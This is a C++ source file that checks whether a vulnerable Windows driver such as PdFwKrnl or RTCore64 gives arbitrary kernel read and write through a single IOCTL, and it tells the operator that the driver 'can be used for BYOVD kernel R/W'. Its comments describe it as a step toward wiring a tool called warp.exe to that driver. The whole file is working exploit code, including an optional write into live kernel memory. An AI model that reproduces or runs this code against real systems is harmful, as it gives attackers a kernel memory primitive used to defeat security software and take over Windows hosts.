/*
 * validate_drivers.cpp
 *
 * Purpose: PROVE a candidate BYOVD driver actually gives kernel R/W before we wire
 *          warp.exe to it. Reads a known kernel value (ntoskrnl base from the driver
 *          list, then reads the first 16 bytes back) and reports the result.
 *
 * This is the validation step the article performs with KDU / manual reverse. We
 * automate the "does this IOCTL dispatch to memmove(dst,src,size) with no validation"
 * check by attempting a READ of a kernel address we already know and confirming the
 * bytes land in our user-mode buffer.
 *
 * Usage:
 *   validate_drivers <device> <ioctl_hex> <struct:pdfw|generic> [read_addr_hex]
 *
 *   device     : e.g. \\.\Global\PdFwKrnl   (or \\.\ConTek, \\.\RTCore64, ...)
 *   ioctl_hex  : e.g. 0x80002014
 *   struct     : "pdfw"   = 48-byte layout used by PDFWKRNL (dst@0x10 src@0x18 size@0x28)
 *                "generic" = 24-byte layout (dst@0x00 src@0x08 size@0x10)
 *                Some drivers use different offsets; this covers the two most common.
 *   read_addr  : (optional) kernel VA to read. Defaults to the ntoskrnl base we
 *                obtained from EnumDeviceDrivers.
 *
 * Safe by default: READ-only. It never writes to kernel memory. It only issues a
 * read IOCTL and checks whether the user buffer was populated with plausible kernel
 * bytes. If you explicitly pass --write-test it will write 1 byte to a kernel address
 * it just read first, then restore it (stronger proof of the write primitive).
 */
#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <cstdint>
#include <cstring>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ntdll.lib")

typedef struct _REQ_PFW {
    BYTE  Reserved[16];
    PVOID Destination;
    PVOID Source;
    PVOID Reserved2;
    DWORD Size;
    DWORD Reserved3;
} REQ_PFW;
static_assert(sizeof(REQ_PFW) == 48, "REQ_PFW must be 48 bytes");

typedef struct _REQ_GENERIC {
    PVOID Destination;
    PVOID Source;
    DWORD Size;
    DWORD Padding;
} REQ_GENERIC;
static_assert(sizeof(REQ_GENERIC) == 24, "REQ_GENERIC must be 24 bytes");

static HANDLE g_dev = INVALID_HANDLE_VALUE;
static DWORD  g_ioctl = 0;
static bool   g_pdfw = true;

static bool issueRead(uint64_t kaddr, void* ubuf, DWORD size) {
    DWORD got = 0;
    if (g_pdfw) {
        REQ_PFW r{};
        r.Destination = ubuf; r.Source = (PVOID)kaddr; r.Size = size;
        return DeviceIoControl(g_dev, g_ioctl, &r, sizeof(r), &r, sizeof(r), &got, NULL);
    } else {
        REQ_GENERIC r{};
        r.Destination = ubuf; r.Source = (PVOID)kaddr; r.Size = size;
        return DeviceIoControl(g_dev, g_ioctl, &r, sizeof(r), &r, sizeof(r), &got, NULL);
    }
}

static bool issueWrite(uint64_t kaddr, const void* ubuf, DWORD size) {
    DWORD got = 0;
    if (g_pdfw) {
        REQ_PFW r{};
        r.Destination = (PVOID)kaddr; r.Source = ubuf; r.Size = size;
        return DeviceIoControl(g_dev, g_ioctl, &r, sizeof(r), &r, sizeof(r), &got, NULL);
    } else {
        REQ_GENERIC r{};
        r.Destination = (PVOID)kaddr; r.Source = ubuf; r.Size = size;
        return DeviceIoControl(g_dev, g_ioctl, &r, sizeof(r), &r, sizeof(r), &got, NULL);
    }
}

int main(int argc, char** argv) {
    if (argc < 4) {
        std::cout
          << "usage: validate_drivers <device> <ioctl_hex> <pdfw|generic> [read_addr_hex] [--write-test]\n"
          << "e.g. validate_drivers \\\\.\\Global\\PdFwKrnl 0x80002014 pdfw\n";
        return 2;
    }
    // argv[1]=device argv[2]=ioctl argv[3]=layout ; argv[4..]= optional read_addr / --write-test
    std::string devUtf8 = argv[1];
    int wlen = MultiByteToWideChar(CP_UTF8, 0, devUtf8.c_str(), -1, NULL, 0);
    std::wstring devName;
    if (wlen > 0) { devName.resize(wlen - 1); MultiByteToWideChar(CP_UTF8, 0, devUtf8.c_str(), -1, &devName[0], wlen); }
    uint64_t ioctlVal = (uint64_t)strtoull(argv[2], nullptr, 16);
    std::string layout = argv[3];
    uint64_t readAddr = 0;
    bool writeTest = false;
    for (int i = 4; i < argc; i++) {
        std::string a = argv[i];
        if (a == "--write-test") { writeTest = true; continue; }
        if (a.size() >= 3 && a[0] == '0' && (a[1] == 'x' || a[1] == 'X')) {
            readAddr = strtoull(a.c_str(), nullptr, 16);
        }
    }

    g_ioctl = (DWORD)ioctlVal;
    g_pdfw = (layout == "pdfw");

    // Open the device
    g_dev = CreateFileW(devName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Cannot open " << devName << "  Error=" << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Opened device: " << devName << std::endl;

    // Determine a read address: default to ntoskrnl base.
    if (readAddr == 0) {
        LPVOID drivers[1024]; DWORD cb=0;
        if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb) && cb/sizeof(LPVOID) > 0)
            readAddr = (uint64_t)drivers[0];
    }
    if (readAddr == 0) { std::cerr << "[-] no kernel base to read" << std::endl; return 1; }
    std::cout << "[*] Reading kernel VA 0x" << std::hex << readAddr << std::dec << " (16 bytes)" << std::endl;

    BYTE buf[16] = {};
    bool ok = issueRead(readAddr, buf, 16);
    if (!ok) {
        std::cerr << "[-] READ IOCTL failed: Error=" << GetLastError() << std::endl;
        return 1;
    }
    // Sanity: kernel pages typically do not start with 0x90 padding; but we just
    // want to confirm the buffer was populated (not all zeros) AND is plausible.
    int nonzero = 0, printable = 0;
    for (int i = 0; i < 16; i++) {
        if (buf[i] != 0) nonzero++;
        if (buf[i] >= 0x20 && buf[i] < 0x7f) printable++;
    }
    std::cout << "[*] Read OK. bytes:";
    for (int i = 0; i < 16; i++) printf(" %02x", buf[i]);
    std::cout << "\n    nonzero=" << nonzero << " printable=" << printable << std::endl;
    if (nonzero == 0) {
        std::cerr << "[!] Buffer all zeros - device may have ignored the request or mapped to a zero page. Not conclusive." << std::endl;
        return 3;
    }

    if (writeTest) {
        std::cout << "[*] WRITE test: writing 1 byte 0x55 to 0x" << std::hex << readAddr << std::dec
                  << ", then restoring." << std::endl;
        BYTE orig = buf[0];
        BYTE want = 0x55;
        if (!issueWrite(readAddr, &want, 1)) {
            std::cerr << "[-] WRITE IOCTL failed: Error=" << GetLastError() << std::endl;
            return 4;
        }
        BYTE chk = 0;
        issueRead(readAddr, &chk, 1);
        // Restore unconditionally.
        issueWrite(readAddr, &orig, 1);
        if (chk == want) {
            std::cout << "[!!!] WRITE primitive CONFIRMED (byte changed to 0x55, restored to 0x"
                      << std::hex << orig << std::dec << ")." << std::endl;
        } else {
            std::cerr << "[!] WRITE did not take effect (read-back 0x" << std::hex << chk << std::dec
                      << ", expected 0x55). Driver may restrict writes." << std::endl;
        }
    } else {
        std::cout << "[!] READ-only validation. Pass --write-test to confirm the write primitive too." << std::endl;
    }

    std::cout << "\n[+] VALIDATION RESULT: this driver can be used for BYOVD kernel R/W." << std::endl;
    CloseHandle(g_dev);
    return 0;
}
